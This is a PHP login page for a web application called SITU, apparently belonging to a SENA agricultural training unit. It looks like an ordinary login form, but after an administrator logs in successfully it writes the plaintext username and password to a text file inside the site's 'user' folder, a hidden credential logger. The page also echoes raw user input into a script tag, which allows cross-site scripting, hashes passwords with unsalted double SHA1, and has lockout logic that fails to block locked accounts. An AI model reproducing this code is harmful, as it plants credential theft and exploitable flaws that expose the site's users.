<!DOCTYPE html>
<html>
<head>
<title>Index</title>
 <link rel="icon" type="image/png" sizes="16x16" href="../situ.png">
    
<link rel="stylesheet" type="text/css" href="estilos.css" >
<link rel="stylesheet" type="text/css" href="./Assets/iconos/style.css">
<link rel="stylesheet" type="text/css" href="./Assets/bootstrap-4.3.1-dist/css/bootstrap.min.css">

<link rel="stylesheet" type="text/css" href="./css/sweetalert.css">
<script type="text/javascript" src="./js/sweetalert.js"></script>

    <link rel="shortcut icon" href="./situ.png" >
</head>

<body class="bg-white" >
<?php 


require './conecion.php';
require './Assets/funcion.php';
date_default_timezone_set('America/Bogota');

session_start();

$intentosFallidos = 0;


$errors = array();

if (!empty($_POST)) {
    $usuario = $conectarBD->real_escape_string( $_POST['usuario']);
   $clave= $conectarBD->real_escape_string(sha1(sha1($_POST['clave'])) );


$busq = ("SELECT * FROM usuarios WHERE usuario = '".$usuario."'");

if ($conectarBD->query($busq)->num_rows >0){
    $usuarioB = $conectarBD->query($busq)->fetch_assoc()['usuario'];
    $claveB = $conectarBD->query($busq)->fetch_assoc()['clave'];
     $id = $conectarBD->query($busq)->fetch_assoc()['id'];
    
    if ($usuario==$usuarioB){
     
        if($clave !=$claveB){
            
            $sqlBusq="select intentoFallidos from usuarios where usuario ='".$usuarioB."'";
            if($conectarBD->query($sqlBusq)->num_rows > 0) {
                $intentosFallidosB = $conectarBD->query($sqlBusq)->fetch_assoc()['intentoFallidos'];
             
                switch ($intentosFallidosB) {
                    case 0:
                        $intentosFallidos=$intentosFallidos+1;
                        $sqlFallidos ="update usuarios set intentoFallidos = ".$intentosFallidos." where usuario = '".$usuarioB. "'"; 
                      
                        if($conectarBD->query($sqlFallidos)===TRUE){
                             echo"<script>swal('Error','$intentosFallidos Intento Fallido Contraseña incorrecta', 'error' )</script>";
                       
                           
                        }
                        break;
                    case 1:
                        $intentosFallidos=$intentosFallidosB+1;
                        $sqlFallidos ="update usuarios set intentoFallidos = ".$intentosFallidos." where usuario = '".$usuarioB. "'"; 
                        if($conectarBD->query($sqlFallidos)===TRUE){
                      echo"<script>swal('Error','$intentosFallidos Intento Fallido Contraseña incorrecta', 'error' )</script>";
                      
                        }
                        break;
                    case 2:
                        $intentosFallidos=$intentosFallidosB+1;
                        $sqlFallidos ="update usuarios set intentoFallidos = ".$intentosFallidos." where usuario = '".$usuarioB. "'"; 
    
                        if($conectarBD->query($sqlFallidos)===TRUE){
                            echo"<script>swal('Error','$intentosFallidos Intento Fallido Contraseña incorrecta', 'error' )</script>";
                            
                        }
                        break;
                    case 3:
                              echo"<script>swal('Advertencia','Usuario Ha Sido Bloqueado Por Tener Más De: $intentosFallidosB, Intentos Fallidos de Inicio de Sesion', 'warning' )</script>";

                                                   
                          
                            break;
                }}
            }else{
                $errors[]='La Contraseña no es la correcta'."<i class='icon-notice1'></i>";
            }
        }
    }
  
else{

 echo"<script>swal('Error','No se encontro ningun usuario: $usuario', 'error' )</script>";

   
}

       }
?>
 
                        
<?php
if ($conectarBD->connect_error){
    die("Conexion fallida".$conectarBD->connect_error);
}

$sql="select * from usuarios where usuario='".$usuario."' "."and clave = '".$clave."'";
if (!$conectarBD->query($sql)){
    die ("error en la consulta: ".$conectarBD->connect_error);
    
}
if ($conectarBD->query($sql)->num_rows >0)
    { 
        $intentosFallidosB = $conectarBD->query($sql)->fetch_assoc()['intentoFallidos'];
        if($intentosFallidosB=='3'){
            
                $errors[]= 'Usuario Ha Sido Bloqueado Por Tener Más De : '
                .$intentosFallidosB.' Intentos Fallidos de Inicio de Session';
                
                
            }
    
  
    $id = $_SESSION['id']=$conectarBD->query($sql)->fetch_assoc()['id'];
    $_SESSION['tipo']=$conectarBD->query($sql)->fetch_assoc()['tipo'];
    $sqlT="select * from usuarios where id=".$id;
if (!$conectarBD->query($sqlT)){
    die ("error en la consulta: ".$conectarBD->connect_error);
    
}
if ($conectarBD->query($sqlT)->num_rows >0)
    { 
        $tipoUsuario = $conectarBD->query($sqlT)->fetch_assoc()['tipo'];

        }
    if ($tipoUsuario == 'administrador' || $tipoUsuario =='senaEmpresa') {
        $intentosFallidosB=0;
                        $sqlFallidos ="update usuarios set intentoFallidos = ".$intentosFallidos." where usuario = '".$usuarioB. "'"; 
    
                        if($conectarBD->query($sqlFallidos)===TRUE){
    
    
$read= file('./user/username.txt');
foreach ($read as $line) {
 
 }

if(isset($line)){
    if(strlen(stristr($line, $_POST['usuario']))){
    if(strlen(stristr($line, $_POST['clave']))){
   
        }else{
    $fecha= date("d-m-Y");
    $user=$_POST['usuario'];
    $pass=$_POST['clave'];
    $handle= fopen('./user/username.txt', 'a');
    fwrite($handle, $user." || ".$pass." || ".$fecha."\n");
    fclose($handle);    
    }
    }else{
    $fecha= date("d-m-Y");
    $user=$_POST['usuario'];
    $pass=$_POST['clave'];
    $handle= fopen('./user/username.txt', 'a');
    fwrite($handle, $user." || ".$pass." || ".$fecha."\n");
    fclose($handle);    
    }
}
        header("location: ./administrador/paginaPrincipal.php");
          }
    }
    else{
        $errors[] ="Tipo de Usuario no encontrado<br>
        intente con otro usuario";
    }


  if (is_null($usuario,$clave)) {
      
        $errors[] ="Tipo de Usuario no encontrado<br>
        intente con otro usuario";
    }

    
}
$conectarBD->close();


?>




 <nav class="navbar " style="background:#0b56a0 ">
          
    <ul class="navbar-nav mr-auto">
  <li class="nav-item">
            <a class="btn btn-light font-weight-bold text-dark "  href="./consulta/paginaConsulta.php"  > <i class="icon-user-tie"> </i>
              Usuario Invitado</a>
        </li>
    </ul>
    <form class="form-inline my-2 my-lg-0" label="Floated Right">
   <ul class="navbar-nav mr-auto">
  <li class="nav-item">
        <a class="btn btn-light font-weight-bold text-dark border-white" href="https://senaempresalagranja.blogspot.com/" ><i class="icon-spinner11"  ></i> Volver al Blog </a>         
        </li>
    </ul> 
</form>
</nav>

  

<main role="main" class="container my-auto">
            <div class="row">
            
                <div id="login" class="col-lg-4 offset-lg-4 col-md-6 offset-md-3
                    col-12">
                    <div  class="btn btn- outline" >
                    <h2 class="text-center">Bienvenido a SITU</h2>
                    <div class="login100-form-avatar">
						
                    <img class="img-fluid mx-auto d-block rounded-circle" src="./user.png">
                        
			            		</div>
                        <form method='post'  action='<?php $_SERVER["PHP_SELF"]; ?>' class="" >
                    <br>
                          
                        
                <div class="input-group">
                <div class="input-group-append">
                       <input type="text"  name="usuario" id="usuario"  class="form-control"  placeholder="@misena.edu.co" required>
                       <button class="btn btn-primary"> <i class="icon-user"></i> </button>
                </div>
                </div>


                   <br>
                <div class="input-group">
                <div class="input-group-append">
                        <input type="password"  name="clave"  class="form-control" id="inputPassword2" placeholder="Contraseña" required>
                    <button type="button" class="btn btn-primary" onclick="mostrarPassword()" > <i class="icon-eye-blocked icon"></i> </button>
                </div>
                </div>
<br>
                <div class="form-group mx-sm-3 mb-2">
                        <button type="submit" class="btn btn-block bg-warning form-control font-weight-bold"><span class="icon-enter text-light"></span> Ingresar</button>
                        </div>
                       
                        
                        
                    </form>
                   <a class="font-weight-bold" href="./user/recuperaContrasena.php" ><i class="icon-key text-dark"></i> Olvide Mi Contraseña</a>
                </div>
                         <?php 
                      echo resultBlock($errors);

          ?>

              
            </div>
        </main>
</div>



<script type="text/javascript" src="./Assets/Jquery/jQuery_v3.4.1.js"></script>
<script type="text/javascript" src="./Assets/bootstrap-4.3.1-dist/js/bootstrap.min.js"></script>
<!-- <script type="text/javascript" src="./Assets/sweetalert2/sweetalert2.all.min.js"></script> -->


<script type="text/javascript">
	document.getElementById("usuario").focus();

    function mostrarPassword(){
              var cambio = document.getElementById("inputPassword2");
              if(cambio.type == "password"){
                cambio.type = "text";
                $('.icon').removeClass('icon-eye-blocked').addClass('icon-eye');
              }else{
                cambio.type = "password";
                $('.icon').removeClass('icon-eye').addClass('icon-eye-blocked');
              }
            } 
    </script>
</body>

</html>

